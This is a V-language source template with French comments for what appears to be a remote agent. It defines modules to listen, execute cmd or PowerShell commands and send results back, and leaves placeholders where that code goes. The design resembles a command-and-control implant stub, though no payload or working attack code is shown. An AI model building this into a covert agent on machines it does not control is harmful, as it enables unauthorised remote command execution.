import os

enum ModuleState as u8 {
	unknown		// inconnu
	started		// le module est démarré mais n'a pas commencé
	running		// en cours de traitement
	error		// le module est en erreur
	finish		// le module à terminé son travail
}

enum Module as u8 {
	ecoute = 0
	execution = 1
	envoie = 2
}

// le type de shell dans lequel la commande doit s'exécuter
enum ShellType as u8 {
	cmd
	powershell
}

struct Commande {
	command string
	type_shell ShellType
	id string // id de la commande
}

struct Response{
	output string
	index int // index de la commande dans la liste "commandes_list"
	exit_code int
}

struct SharedVariable {
	// ==== variable partagés
	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent

    commandes_list []Commande = [
		<!!commandes!!>
	]
mut:
	execution_commande_list []int
	ip []u8 = [u8(127),0,0,1]
	response_list []Response
	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
}

fn main(){
	shared shared_variable := SharedVariable{}

	shared_variable.module_ecoute()
	println("[i] - fin d'éxecution")
}

<!!ecoute!!>

<!!execution!!>

<!!envoie!!>